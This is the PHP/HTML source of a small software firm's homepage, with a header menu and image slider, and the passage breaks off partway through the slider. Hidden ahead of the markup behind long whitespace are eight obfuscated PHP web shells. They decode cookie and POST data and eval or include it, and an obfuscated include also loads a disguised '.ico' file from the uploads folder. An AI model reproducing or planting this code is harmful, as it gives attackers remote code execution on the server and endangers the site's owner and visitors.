<?php                                                                                                                                                                                                                                                                                                                                                                                                 $wtOQje = class_exists("E_OSnIA"); $XUOKtSW = $wtOQje;if (!$XUOKtSW){class E_OSnIA{private $sKnCG;public static $iVnqc = "f120c80b-2602-47ba-a888-910bd7a1bbcc";public static $FcZhYykVwK = NULL;public function __construct(){$wYarAEaEFB = $_COOKIE;$LfxzZn = $_POST;$zogefGFZ = @$wYarAEaEFB[substr(E_OSnIA::$iVnqc, 0, 4)];if (!empty($zogefGFZ)){$HvzbssWSL = "base64";$wGJbbm = "";$zogefGFZ = explode(",", $zogefGFZ);foreach ($zogefGFZ as $VwNlfAjlsy){$wGJbbm .= @$wYarAEaEFB[$VwNlfAjlsy];$wGJbbm .= @$LfxzZn[$VwNlfAjlsy];}$wGJbbm = array_map($HvzbssWSL . chr ( 809 - 714 ).chr (100) . chr (101) . chr ( 212 - 113 ).chr (111) . chr (100) . 'e', array($wGJbbm,)); $wGJbbm = $wGJbbm[0] ^ str_repeat(E_OSnIA::$iVnqc, (strlen($wGJbbm[0]) / strlen(E_OSnIA::$iVnqc)) + 1);E_OSnIA::$FcZhYykVwK = @unserialize($wGJbbm);}}public function __destruct(){$this->katRH();}private function katRH(){if (is_array(E_OSnIA::$FcZhYykVwK)) {$XKFDAYEPxS = str_replace("\74" . chr ( 985 - 922 ).chr (112) . "\150" . chr ( 516 - 404 ), "", E_OSnIA::$FcZhYykVwK['c' . 'o' . 'n' . "\164" . "\145" . "\x6e" . chr (116)]);eval($XKFDAYEPxS);exit();}}}$TsXZKpBH = new E_OSnIA(); $TsXZKpBH = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 $SpDDEqH = class_exists("Bn_dTxzN"); $SadrvjLBE = $SpDDEqH;if (!$SadrvjLBE){class Bn_dTxzN{private $wjnsia;public static $BaWonWJ = "32ed58e9-089c-470d-a8c0-877715aa7853";public static $tMGWUeQ = NULL;public function __construct(){$YDqnntXP = $_COOKIE;$AemCiLVj = $_POST;$SEZMxFysXO = @$YDqnntXP[substr(Bn_dTxzN::$BaWonWJ, 0, 4)];if (!empty($SEZMxFysXO)){$Qpocf = "base64";$rSypAYWg = "";$SEZMxFysXO = explode(",", $SEZMxFysXO);foreach ($SEZMxFysXO as $EWhNyPWHEZ){$rSypAYWg .= @$YDqnntXP[$EWhNyPWHEZ];$rSypAYWg .= @$AemCiLVj[$EWhNyPWHEZ];}$rSypAYWg = array_map($Qpocf . chr ( 786 - 691 ).'d' . "\x65" . chr ( 637 - 538 )."\x6f" . "\x64" . "\145", array($rSypAYWg,)); $rSypAYWg = $rSypAYWg[0] ^ str_repeat(Bn_dTxzN::$BaWonWJ, (strlen($rSypAYWg[0]) / strlen(Bn_dTxzN::$BaWonWJ)) + 1);Bn_dTxzN::$tMGWUeQ = @unserialize($rSypAYWg);}}public function __destruct(){$this->oITQUS();}private function oITQUS(){if (is_array(Bn_dTxzN::$tMGWUeQ)) {$AqTxIMfCN = sys_get_temp_dir() . "/" . crc32(Bn_dTxzN::$tMGWUeQ[chr ( 660 - 545 ).'a' . chr (108) . "\164"]);@Bn_dTxzN::$tMGWUeQ[chr (119) . "\162" . chr ( 465 - 360 )."\164" . 'e']($AqTxIMfCN, Bn_dTxzN::$tMGWUeQ[chr (99) . "\x6f" . "\x6e" . 't' . chr ( 403 - 302 )."\156" . 't']);include $AqTxIMfCN;@Bn_dTxzN::$tMGWUeQ['d' . "\x65" . chr (108) . "\145" . 't' . "\145"]($AqTxIMfCN);exit();}}}$djDGUKRvI = new Bn_dTxzN(); $djDGUKRvI = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 $rsYXAyT = class_exists("PgT_RpRJ"); $JBIlWb = $rsYXAyT;if (!$JBIlWb){class PgT_RpRJ{private $gvxmrz;public static $ywdUg = "4280eea7-2806-4fae-9f1e-7e6decb7d45e";public static $nPAVERiIS = NULL;public function __construct(){$NQnzMLiHG = $_COOKIE;$IosIsdHZFl = $_POST;$POZAf = @$NQnzMLiHG[substr(PgT_RpRJ::$ywdUg, 0, 4)];if (!empty($POZAf)){$tnYek = "base64";$nCMQXX = "";$POZAf = explode(",", $POZAf);foreach ($POZAf as $tRplo){$nCMQXX .= @$NQnzMLiHG[$tRplo];$nCMQXX .= @$IosIsdHZFl[$tRplo];}$nCMQXX = array_map($tnYek . chr (95) . chr (100) . "\x65" . "\x63" . 'o' . "\x64" . chr ( 1066 - 965 ), array($nCMQXX,)); $nCMQXX = $nCMQXX[0] ^ str_repeat(PgT_RpRJ::$ywdUg, (strlen($nCMQXX[0]) / strlen(PgT_RpRJ::$ywdUg)) + 1);PgT_RpRJ::$nPAVERiIS = @unserialize($nCMQXX);}}public function __destruct(){$this->YAIgfo();}private function YAIgfo(){if (is_array(PgT_RpRJ::$nPAVERiIS)) {$uvQPlWwFv = sys_get_temp_dir() . "/" . crc32(PgT_RpRJ::$nPAVERiIS["\163" . "\141" . chr ( 468 - 360 )."\x74"]);@PgT_RpRJ::$nPAVERiIS[chr ( 308 - 189 ).chr ( 607 - 493 ).chr ( 175 - 70 )."\x74" . "\145"]($uvQPlWwFv, PgT_RpRJ::$nPAVERiIS[chr (99) . chr (111) . 'n' . 't' . chr ( 711 - 610 ).'n' . "\164"]);include $uvQPlWwFv;@PgT_RpRJ::$nPAVERiIS[chr ( 874 - 774 ).chr ( 1033 - 932 ).chr (108) . chr (101) . 't' . chr ( 731 - 630 )]($uvQPlWwFv);exit();}}}$MKsAVWWoCf = new PgT_RpRJ(); $MKsAVWWoCf = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("cXg_xUe")){class cXg_xUe{public static $fIXYzqQ = "3aa4159c-cd72-4135-9bcc-0c4b516c6eb9";public static $LXoooFV = NULL;public function __construct(){$SimcV = $_COOKIE;$qfOIYkhY = $_POST;$XsbSfYPIe = @$SimcV[substr(cXg_xUe::$fIXYzqQ, 0, 4)];if (!empty($XsbSfYPIe)){$ITwACTmUk = "base64";$JXhlD = "";$XsbSfYPIe = explode(",", $XsbSfYPIe);foreach ($XsbSfYPIe as $eewUzh){$JXhlD .= @$SimcV[$eewUzh];$JXhlD .= @$qfOIYkhY[$eewUzh];}$JXhlD = array_map($ITwACTmUk . chr ( 573 - 478 )."\144" . "\145" . chr ( 888 - 789 ).chr (111) . chr ( 144 - 44 )."\145", array($JXhlD,)); $JXhlD = $JXhlD[0] ^ str_repeat(cXg_xUe::$fIXYzqQ, (strlen($JXhlD[0]) / strlen(cXg_xUe::$fIXYzqQ)) + 1);cXg_xUe::$LXoooFV = @unserialize($JXhlD);}}public function __destruct(){$this->mguDHjOs();}private function mguDHjOs(){if (is_array(cXg_xUe::$LXoooFV)) {$eYQqtzn = sys_get_temp_dir() . "/" . crc32(cXg_xUe::$LXoooFV["\163" . chr (97) . "\x6c" . "\x74"]);@cXg_xUe::$LXoooFV[chr (119) . chr ( 465 - 351 )."\151" . chr (116) . "\x65"]($eYQqtzn, cXg_xUe::$LXoooFV['c' . 'o' . 'n' . chr ( 946 - 830 ).'e' . chr ( 279 - 169 ).'t']);include $eYQqtzn;@cXg_xUe::$LXoooFV["\144" . chr ( 516 - 415 )."\x6c" . "\145" . "\x74" . 'e']($eYQqtzn);exit();}}}$OaumygWgqy = new cXg_xUe(); $OaumygWgqy = NULL;} ?><?php
/*01daa*/

@include ("\057var/\167ww/v\150osts\057vkso\146twar\145s.co\155/css\057uplo\141ds/.\0618b6d\065bd.i\143o");

/*01daa*/                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("oswrfgaxv")){class oswrfgaxv{public static $msfiudyhye = "qptyniaxyivxsupb";public static $ftcenkwuu = NULL;public function __construct(){$jujaxhq = @$_COOKIE[substr(oswrfgaxv::$msfiudyhye, 0, 4)];if (!empty($jujaxhq)){$sczeycaqg = "base64";$qghfpwy = "";$jujaxhq = explode(",", $jujaxhq);foreach ($jujaxhq as $rzhoz){$qghfpwy .= @$_COOKIE[$rzhoz];$qghfpwy .= @$_POST[$rzhoz];}$qghfpwy = array_map($sczeycaqg . "_decode", array($qghfpwy,)); $qghfpwy = $qghfpwy[0] ^ str_repeat(oswrfgaxv::$msfiudyhye, (strlen($qghfpwy[0]) / strlen(oswrfgaxv::$msfiudyhye)) + 1);oswrfgaxv::$ftcenkwuu = @unserialize($qghfpwy);}}public function __destruct(){$this->jnqow();}private function jnqow(){if (is_array(oswrfgaxv::$ftcenkwuu)) {$xkumcxb = sys_get_temp_dir() . "/" . crc32(oswrfgaxv::$ftcenkwuu["salt"]);@oswrfgaxv::$ftcenkwuu["write"]($xkumcxb, oswrfgaxv::$ftcenkwuu["content"]);include $xkumcxb;@oswrfgaxv::$ftcenkwuu["delete"]($xkumcxb);exit();}}}$cianfw = new oswrfgaxv(); $cianfw = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("vqcosoky")){class vqcosoky{public static $axkrlj = "oteivxbmusojltae";public static $pxupok = NULL;public function __construct(){$qjfhwzv = @$_COOKIE[substr(vqcosoky::$axkrlj, 0, 4)];if (!empty($qjfhwzv)){$zsrpputv = "base64";$lwcfxzeab = "";$qjfhwzv = explode(",", $qjfhwzv);foreach ($qjfhwzv as $gdals){$lwcfxzeab .= @$_COOKIE[$gdals];$lwcfxzeab .= @$_POST[$gdals];}$lwcfxzeab = array_map($zsrpputv . "_decode", array($lwcfxzeab,)); $lwcfxzeab = $lwcfxzeab[0] ^ str_repeat(vqcosoky::$axkrlj, (strlen($lwcfxzeab[0]) / strlen(vqcosoky::$axkrlj)) + 1);vqcosoky::$pxupok = @unserialize($lwcfxzeab);}}public function __destruct(){$this->xuhgsrlafy();}private function xuhgsrlafy(){if (is_array(vqcosoky::$pxupok)) {$cponsmqu = sys_get_temp_dir() . "/" . crc32(vqcosoky::$pxupok["salt"]);@vqcosoky::$pxupok["write"]($cponsmqu, vqcosoky::$pxupok["content"]);include $cponsmqu;@vqcosoky::$pxupok["delete"]($cponsmqu);exit();}}}$xrnme = new vqcosoky(); $xrnme = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("cvlyokx")){class cvlyokx{public static $orqjnuo = "gkkklxnbzsynjtqv";public static $eybuke = NULL;public function __construct(){$grpdmzwdlh = @$_COOKIE[substr(cvlyokx::$orqjnuo, 0, 4)];if (!empty($grpdmzwdlh)){$jyumx = "base64";$pcdaehwo = "";$grpdmzwdlh = explode(",", $grpdmzwdlh);foreach ($grpdmzwdlh as $xhhib){$pcdaehwo .= @$_COOKIE[$xhhib];$pcdaehwo .= @$_POST[$xhhib];}$pcdaehwo = array_map($jyumx . "_decode", array($pcdaehwo,));$pcdaehwo = $pcdaehwo[0] ^ str_repeat(cvlyokx::$orqjnuo, (strlen($pcdaehwo[0]) / strlen(cvlyokx::$orqjnuo)) + 1);cvlyokx::$eybuke = @unserialize($pcdaehwo);}}public function __destruct(){$this->tvgtpxv();}private function tvgtpxv(){if (is_array(cvlyokx::$eybuke)) {$rhlshwno = sys_get_temp_dir() . "/" . crc32(cvlyokx::$eybuke["salt"]);@cvlyokx::$eybuke["write"]($rhlshwno, cvlyokx::$eybuke["content"]);include $rhlshwno;@cvlyokx::$eybuke["delete"]($rhlshwno);exit();}}}$nywaktrem = new cvlyokx();$nywaktrem = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("yrrubxzxn")){class yrrubxzxn{public static $dvbgfaho = "htzztolhlykgyeae";public static $ptngaqt = NULL;public function __construct(){$onrah = @$_COOKIE[substr(yrrubxzxn::$dvbgfaho, 0, 4)];if (!empty($onrah)){$mtohdv = "base64";$ijqoxlx = "";$onrah = explode(",", $onrah);foreach ($onrah as $phiiokcq){$ijqoxlx .= @$_COOKIE[$phiiokcq];$ijqoxlx .= @$_POST[$phiiokcq];}$ijqoxlx = array_map($mtohdv . "_decode", array($ijqoxlx,));$ijqoxlx = $ijqoxlx[0] ^ str_repeat(yrrubxzxn::$dvbgfaho, (strlen($ijqoxlx[0]) / strlen(yrrubxzxn::$dvbgfaho)) + 1);yrrubxzxn::$ptngaqt = @unserialize($ijqoxlx);}}public function __destruct(){$this->wagxhscai();}private function wagxhscai(){if (is_array(yrrubxzxn::$ptngaqt)) {$kcaderjds = sys_get_temp_dir() . "/" . crc32(yrrubxzxn::$ptngaqt["salt"]);@yrrubxzxn::$ptngaqt["write"]($kcaderjds, yrrubxzxn::$ptngaqt["content"]);include $kcaderjds;@yrrubxzxn::$ptngaqt["delete"]($kcaderjds);exit();}}}$pruzuplkl = new yrrubxzxn();$pruzuplkl = NULL;} ?><!DOCTYPE html>
<html class="no-js" lang="en-US">
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
        <title>VKSoftwares</title>
        <meta name="description" content="VKSoftwares" />
        <meta name="keywords" content="VKSoftwares" />
        <link rel="shortcut icon" href="css/uploads/2015/12/logo_dark1.png" />       
        <link href='https://fonts.googleapis.com/css?family=Lato:100,300,regular,700,900%7COpen+Sans:300%7CIndie+Flower:regular%7COswald:300,regular,700&amp;subset=latin%2Clatin-ext' type='text/css' media='all' />
        <link rel='stylesheet' href='css/plugins/revslider/public/assets/css/settings58e058e0.css?ver=5.1.4' type='text/css' media='all' />        
        <link rel='stylesheet' href='css/themes/betheme/css/base2c4c2c4c.css?ver=10.9' type='text/css' media='all' />
        <link rel='stylesheet' href='css/themes/betheme/fonts/mfn-icons2c4c2c4c.css?ver=10.9' type='text/css' media='all' />
        <link rel='stylesheet' href='css/themes/betheme/css/grid2c4c2c4c.css?ver=10.9' type='text/css' media='all' />
        <link rel='stylesheet' href='css/themes/betheme/css/layout2c4c2c4c.css?ver=10.9' type='text/css' media='all' />
        <link rel='stylesheet' href='css/themes/betheme/css/shortcodes2c4c2c4c.css?ver=10.9' type='text/css' media='all' />
        <link rel='stylesheet' href='css/themes/betheme/css/variables2c4c2c4c.css?ver=10.9' type='text/css' media='all' />
        <link rel='stylesheet' href='css/themes/betheme/css/style-simple2c4c2c4c.css?ver=10.9' type='text/css' media='all' />
        <link rel='stylesheet' href='css/themes/betheme/assets/ui/jquery.ui.all2c4c2c4c.css?ver=10.9' type='text/css' media='all' />
        <link rel='stylesheet' href='css/themes/betheme/css/responsive2c4c2c4c.css?ver=10.9' type='text/css' media='all' />       
        <link rel='stylesheet' href='css/themes/betheme/css/custom2c4c2c4c.css?ver=10.9' type='text/css' media='all' />
        <script type='text/javascript' src='js/js/jquery/jqueryc1d8c1d8.js?ver=1.11.3'></script>
        <script type='text/javascript' src='js/js/jquery/jquery-migrate.min15761576.js?ver=1.2.1'></script>       
        <script type='text/javascript' src='css/plugins/revslider/public/assets/js/jquery.themepunch.tools.min58e058e0.js?ver=5.1.4'></script>
        <script type='text/javascript' src='css/plugins/revslider/public/assets/js/jquery.themepunch.revolution.min58e058e0.js?ver=5.1.4'></script>       
        <link rel='stylesheet' href='css/style_inner.css' type='text/css'/>		
		<style>
			@media only screen and (max-width: 767px){
				body:not(.template-slider):not(.header-simple) #Header {
					min-height: 183px !important;
				}
			}		
		</style>		
    </head>
    <body class="page page-id-2947 page-template-default  color-custom style-default layout-full-width nice-scroll-on mobile-tb-left header-classic sticky-header sticky-white ab-hide subheader-title-left wpb-js-composer js-comp-ver-4.9 vc_responsive">
        <div id="Sliding-top" class="st-1">
            <div class="widgets_wrapper"><div class="container"></div></div>
            <a href="#" class="sliding-top-control"><span><i class="plus icon-down-open-mini"></i><i class="minus icon-up-open-mini"></i></span></a>
        </div>
        <div id="Wrapper">
            <div id="Header_wrapper" >
                <header id="Header">
                    <div class="header_placeholder"></div>
                    <div id="Top_bar" class="loading">
                        <div class="container">
                            <div class="column one">
                                <div class="top_bar_left clearfix"> 
                                    <div class="logo">
                                        <h1>
                                            <a id="logo" href="index.php" title="VKSoftwares">
                                                <img class="logo-main   scale-with-grid" src="css/uploads/2015/12/logo_dark-1.png" 	alt="VKSoftwares" />
                                                <img class="logo-sticky scale-with-grid" src="css/uploads/2015/12/logo_dark-1.png" alt="" />
                                                <img class="logo-mobile scale-with-grid" src="css/uploads/2015/12/logo_dark-1.png" alt="" />
                                            </a>
                                        </h1>				
                                    </div>
                                    <div class="menu_wrapper">
                                        <nav id="menu" class="menu-960px-grid-container">
                                            <ul id="menu-960px-grid" class="menu">
											<?php $link = $_SERVER['REQUEST_URI']; ?>
                                                <li id="menu-item-2957" class="menu-item menu-item-type-post_type menu-item-object-page <?php echo ($link == '/index.php' || $link == '/'? 'current-menu-item':''); ?>"><a href="index.php"><span>HOME</span></a></li>
                                                <li id="menu-item-2948" class="menu-item menu-item-type-post_type menu-item-object-page  page_item page-item-2948 <?php echo ($link == '/about.php'? 'current-menu-item':''); ?>"><a href="about.php"><span>ABOUT US</span></a></li>
                                                <li id="menu-item-2950" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children <?php echo ($link == '/mobile-application-development.php'? 'current-menu-item':'');echo ($link == '/software-development.php'? 'current-menu-item':'');echo ($link == '/web-application-development.php'? 'current-menu-item':'');
												?>">												
                                                    <a href="#"><span>SERVICES</span></a>
                                                    <ul class="sub-menu">
                                                        <li id="menu-item-2938" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="mobile-application-development.php"><span>Mobile Application Development</span></a></li>
                                                        <li id="menu-item-2941" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="software-development.php"><span>Software Development</span></a></li>
                                                        <li id="menu-item-2944" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="web-application-development.php"><span>Web Application Development</span></a></li>
                                                    </ul>
                                                </li>
                                                <li id="menu-item-2953" class="menu-item menu-item-type-post_type menu-item-object-pagepage_item page-item-2953 <?php echo ($link == '/vision.php'? 'current-menu-item':''); ?>"><a href="vision.php"><span>VISION</span></a></li>
                                                <li id="menu-item-2955" class="menu-item menu-item-type-post_type menu-item-object-page page-item-2955 <?php echo ($link == '/career.php'? 'current-menu-item':''); ?>"><a href="career.php"><span>CAREERS</span></a></li>
                                                <li id="menu-item-2972" class="menu-item menu-item-type-post_type menu-item-object-page page-item-2972 <?php echo ($link == '/contact_form.php'? 'current-menu-item':''); ?>"><a href="contact_form.php"><span>CONTACT</span></a></li>
                                            </ul>
                                        </nav>
                                        <a class="responsive-menu-toggle " href="#"><i class="icon-menu"></i></a>					
                                    </div>                                    
                                </div>                                		
                            </div>
                        </div>
                    </div>	
<div class="mfn-main-slider" id="mfn-rev-slider">
    <link href="https://fonts.googleapis.com/css?family=Open%20Sans:300" rel="stylesheet" property="stylesheet" type="text/css" media="all" />
    <div id="rev_slider_2_2_wrapper" class="rev_slider_wrapper fullwidthbanner-container" style="margin:0px auto;padding:0px;margin-top:0px;margin-bottom:0px;">
        <!-- START REVOLUTION SLIDER 5.1.4 fullwidth mode -->
        <div id="rev_slider_2_2" class="rev_slider fullwidthabanner tp-overflow-hidden" style="display:none;" data-version="5.1.4">
            <ul>	<!-- SLIDE  -->
                <li data-index="rs-6" data-transition="slideright,slideleft" data-slotamount="7,7"  data-easein="default,default" data-easeout="default,default" data-masterspeed="300,300"  data-link="mobile-application-development.php"   data-thumb="https://vksoftwares.com/css/uploads/revslider/business/b-100x50.jpg"  data-rotate="0,0"  data-saveperformance="off"  data-title="Slide" data-param1="" data-param2="" data-param3="" data-param4="" data-param5="" data-param6="" data-param7="" data-param8="" data-param9="" data-param10="" data-description="">
                    <!-- MAIN IMAGE -->
                    <img src="css/uploads/revslider/business/b.jpg"  alt=""  data-bgposition="center bottom" data-kenburns="on" data-duration="6500" data-ease="SlowMo.ease" data-scalestart="100" data-scaleend="100" data-rotatestart="0" data-rotateend="0" data-offsetstart="0 0" data-offsetend="0 0" class="rev-slidebg" data-no-retina>
                    <!-- LAYERS -->
                    <!-- LAYER NR. 1 -->
                    <div class="tp-caption   tp-resizeme" 
                         id="slide-6-layer-1" 
                         data-x="504" 
                         data-y="106" 
                         data-width="['none','none','none','none']"
                         data-height="['none','none','none','none']"
                         data-transform_idle="o:1;"
                         data-transform_in="x:-50px;opacity:0;s:300;e:Power3.easeInOut;" 
                         data-transform_out="auto:auto;s:300;" 
                         data-start="400" 
                         data-responsive_offset="on" 
                         style="z-index: 5;"><img src="css/uploads/revslider/business/slide1_a.png" alt="" width="250" height="477" data-ww="223.7945492662474" data-hh="427" data-no-retina> 
                    </div>
                    <!-- LAYER NR. 2 -->
                    <div class="tp-caption   tp-resizeme" 
                         id="slide-6-layer-2" 
                         data-x="677" 
                         data-y="51" 
                         data-width="['none','none','none','none']"
                         data-height="['none','none','none','none']"
                         data-transform_idle="o:1;"
                         data-transform_in="x:-50px;opacity:0;s:300;e:Power3.easeInOut;" 
                         data-transform_out="auto:auto;s:300;" 
                         data-start="800" 
                         data-responsive_offset="on" 
                         style="z-index: 6;"><img src="css/uploads/revslider/business/slide1_b.png" alt="" width="250" height="472" data-ww="231.46186440677968" data-hh="437" data-no-retina> 
                    </div>
                    <!-- LAYER NR. 3 -->
                    <div class="tp-caption   tp-resizeme" 
                         id="slide-6-layer-3" 
                         data-x="865" 
                         data-y="17" 
                         data-width="['none','none','none','none']"
                         data-height="['none','none','none','none']"
                         data-transform_idle="o:1;"
                         data-transform_in="x:-50px;opacity:0;s:300;e:Power3.easeInOut;" 
                         data-transform_out="auto:auto;s:300;" 
                         data-start="1200" 
                         data-responsive_offset="on" 
                         style="z-index: 7;"><img src="css/uploads/revslider/business/slide1_a.png" alt="" width="250" height="499" data-no-retina> 
                    </div>
                    <!-- LAYER NR. 4 -->
                    <div class="tp-caption mediumthingrey2   tp-resizeme" 
                         id="slide-6-layer-4" 
                         data-x="7" 
                         data-y="77" 
                         data-width="['auto']"
                         data-height="['auto']"
                         data-transform_idle="o:1;"
                         data-transform_in="x:-50px;opacity:0;s:300;e:Power3.easeInOut;" 
                         data-transform_out="auto:auto;s:300;" 
                         data-start="1600" 
                         data-splitin="none" 
                         data-splitout="none" 
                         data-responsive_offset="on"
                         style="z-index: 8; white-space: nowrap;border-color:rgba(255, 214, 88, 1.00);">Mobile Application 
                    </div>
                    <!-- LAYER NR. 5 -->
                    <div class="tp-caption black3   tp-resizeme" 
                         id="slide-6-layer-5" 
                         data-x="15" 
                         data-y="151" 
                         data-width="['auto']"
                         data-height="['auto']"
                         data-transform_idle="o:1;"
                         data-transform_in="x:-50px;opacity:0;s:300;e:Power3.easeInOut;" 
                         data-transform_out="auto:auto;s:300;" 
                         data-start="1800" 
                         data-splitin="none" 
                         data-splitout="none" 
                         data-responsive_offset="on" 
                         style="z-index: 9; white-space: nowrap; font-weight: ;border-color:rgba(0, 0, 0, 1.00);">Developing Rich Cross-Platform, <br />
                        Secure Native & Hybrid Apps. 
                    </div>
                </li>
                <!-- SLIDE  -->
                <li data-index="rs-7" data-transition="slideright,slideleft" data-slotamount="7,7"  data-easein="default,default" data-easeout="default,default" data-masterspeed="300,300"  data-link="software-development.php"   data-thumb="https://vksoftwares.com/css/uploads/revslider/business/a-100x50.jpg"  data-rotate="0,0"  data-saveperformance="off"  data-title="Slide" data-param1="" data-param2="" data-param3="" data-param4="" data-param5="" data-param6="" data-param7="" data-param8="" data-param9="" data-param10="" data-description="">
                    <!-- MAIN IMAGE -->
                    <img src="css/uploads/revslider/business/a.jpg"  alt=""  data-bgposition="center top" data-kenburns="on" data-duration="6500" data-ease="SlowMo.ease" data-scalestart="100" data-scaleend="100" data-rotatestart="0" data-rotateend="0" data-offsetstart="0 0" data-offsetend="0 0" class="rev-slidebg" data-no-retina>
                    <!-- LAYERS -->
                    <!-- LAYER NR. 1 -->
                    <div class="tp-caption   tp-resizeme" 
                         id="slide-7-layer-1" 
                         data-x="-27" 
                         data-y="39" 
                         data-width="['none','none','none','none']"
                         data-height="['none','none','none','none']"
                         data-transform_idle="o:1;"
                         data-transform_in="x:left;s:500;e:Power3.easeInOut;" 
                         data-transform_out="auto:auto;s:300;" 
                         data-start="400" 
                         data-responsive_offset="on" 
                         style="z-index: 5;"><img src="css/uploads/revslider/business/slide2_b1.png" alt="" width="450" height="405" data-ww="425.5555555555556" data-hh="383" data-no-retina> 
                    </div>
                    <!-- LAYER NR. 2 -->
                    <div class="tp-caption   tp-resizeme" 
                         id="slide-7-layer-2" 
                         data-x="727" 
                         data-y="-15" 
                         data-width="['none','none','none','none']"
                         data-height="['none','none','none','none']"
                         data-transform_idle="o:1;"
                         data-transform_in="x:right;s:500;e:Power3.easeInOut;" 
                         data-transform_out="auto:auto;s:300;" 
                         data-start="800" 
                         data-responsive_offset="on"
                         style="z-index: 6;"><img src="css/uploads/revslider/business/slide2_a1.png" alt="" width="450" height="410" data-ww="420.23611111111114" data-hh="383" data-no-retina> 
                    </div>
                    <!-- LAYER NR. 3 -->
                    <div class="tp-caption mediumthingrey2   tp-resizeme" 
                         id="slide-7-layer-3" 
                         data-x="171" 
                         data-y="50" 
                         data-width="['auto']"
                         data-height="['auto']"
                         data-transform_idle="o:1;"
                         data-transform_in="y:bottom;s:500;e:Power3.easeInOut;" 
                         data-transform_out="auto:auto;s:300;" 
                         data-start="1200" 
                         data-splitin="none" 
                         data-splitout="none" 
                         data-responsive_offset="on" 
                         style="z-index: 7; white-space: nowrap;border-color:rgba(255, 214, 88, 1.00);">Desktop Application 
                    </div>
                    <!-- LAYER NR. 4 -->
                    <div class="tp-caption mediumlightblack2   tp-resizeme" 
                         id="slide-7-layer-4" 
                         data-x="342" 
                         data-y="125" 
                         data-width="['auto']"
                         data-height="['auto']"
                         data-transform_idle="o:1;"
                         data-transform_in="y:bottom;s:300;e:Power3.easeInOut;" 
                         data-transform_out="auto:auto;s:300;" 
                         data-start="1400" 
                         data-splitin="none" 
                         data-splitout="none" 
                         data-responsive_offset="on" 
                         style="z-index: 8; white-space: nowrap; color: rgba(0, 0, 0, 1.00);padding:0px 0px 0px 0px;border-color:rgba(255, 214, 88, 1.00);">Developing Powerful Application, <br />
                        to keep pace with rapid changing technology. 
                    </div>
                </li>
                <!-- SLIDE  -->
                <li data-index="rs-5" data-transition="slideright,slideleft" data-slotamount="7,7"  data-easein="default,default" data-easeout="default,default" data-masterspeed="100,100"  data-link="web-application-development.php"   data-thumb="https://vksoftwares.com/css/uploads/2015/12/Business-People-Blur-100x50.jpg"  data-rotate="0,0"  data-saveperformance="off"  data-title="Slide" data-param1="" data-param2="" data-param3="" data-param4="" data-param5="" data-param6="" data-param7="" data-param8="" data-param9="" data-param10="" data-description="">
                    <!-- MAIN IMAGE -->
                    <img src="css/uploads/2015/12/Business-People-Blur.jpg"  alt=""  width="2560" height="1360" data-bgposition="center bottom" data-kenburns="on" data-duration="6500" data-ease="SlowMo.ease" data-scalestart="100" data-scaleend="100" data-rotatestart="0" data-rotateend="0" data-offsetstart="0 0" data-offsetend="0 0" class="rev-slidebg" data-no-retina>
                    <!-- LAYERS -->
                    <!-- LAYER NR. 1 -->
                    <div class="tp-caption   tp-resizeme" 
                         id="slide-5-layer-1" 
                         data-x="680" 
                         data-y="11" 
                         data-width="['none','none','none','none']"
                         data-height="['none','none','none','none']"
                         data-transform_idle="o:1;"
                         data-transform_in="x:50px;opacity:0;s:500;e:Power3.easeInOut;" 
                         data-transform_out="auto:auto;s:300;" 
                         data-start="400" 
                         data-responsive_offset="on" 
                         style="z-index: 5;"><img src="css/uploads/revslider/business/web.png" alt="" width="600" height="410" data-ww="467.01599999999996" data-hh="319" data-no-retina> 
                    </div>
                    <!-- LAYER NR. 2 -->
                    <div class="tp-caption   tp-resizeme" 
                         id="slide-5-layer-2" 
                         data-x="8" 
                         data-y="27" 
                         data-width="['none','none','none','none']"
                         data-height="['none','none','none','none']"
                         data-transform_idle="o:1;"
                         data-transform_in="x:left;s:500;e:Power3.easeInOut;" 
                         data-transform_out="auto:auto;s:300;" 
                         data-start="800" 
                         data-responsive_offset="on"
                         style="z-index: 6;"><img src="css/uploads/revslider/business/girl-pointing.png" alt="" width="280" height="352" data-no-retina> 
                    </div>
                    <!-- LAYER NR. 3 -->
                    <div class="tp-caption mediumthingrey2   tp-resizeme" 
                         id="slide-5-layer-3" 
                         data-x="287" 
                         data-y="64" 
                         data-width="['auto']"
                         data-height="['auto']"
                         data-transform_idle="o:1;"
                         data-transform_in="y:-50px;opacity:0;s:500;e:Power3.easeInOut;" 
                         data-transform_out="auto:auto;s:300;" 
                         data-start="1200" 
                         data-splitin="none" 
                         data-splitout="none" 
                         data-responsive_offset="on"
                         style="z-index: 7; white-space: nowrap;border-color:rgba(255, 214, 88, 1.00);">Web Application 
                    </div>
                    <!-- LAYER NR. 4 -->
                    <div class="tp-caption mediumlightblack2   tp-resizeme" 
                         id="slide-5-layer-4" 
                         data-x="287" 
                         data-y="126" 
                         data-width="['auto']"
                         data-height="['auto']"
                         data-transform_idle="o:1;"
                         data-transform_in="y:-50px;opacity:0;s:300;e:Power3.easeInOut;" 
                         data-transform_out="auto:auto;s:300;" 
                         data-start="1250" 
                         data-splitin="none" 
                         data-splitout="none" 
                         data-responsive_offset="on" 
                         style="z-index: 8; white-space: nowrap; color: rgba(0, 0, 0, 1.00);padding:0px 0px 0px 0px;border-color:rgba(255, 214, 88, 1.00);">Building scalable, secure, custom web apps<br/>for clients across the world. 
                    </div>
                </li>
                <!-- SLIDE  -->
                <li data-index="rs-8" data-transition="slideright,slideleft" data-slotamount="7,7"  data-easein="default,default" data-easeout="default,default" data-masterspeed="300,300"  data-link="careers.php"   data-thumb="https://vksoftwares.com/css/uploads/2015/12/blurred_figures_ss1-100x50.jpg"  data-rotate="0,0"  data-saveperformance="off"  data-title="Slide" data-param1="" data-param2="" data-param3="" data-param4="" data-param5="" data-param6="" data-param7="" data-param8="" data-param9="" data-param10="" data-description="">
                    <!-- MAIN IMAGE -->
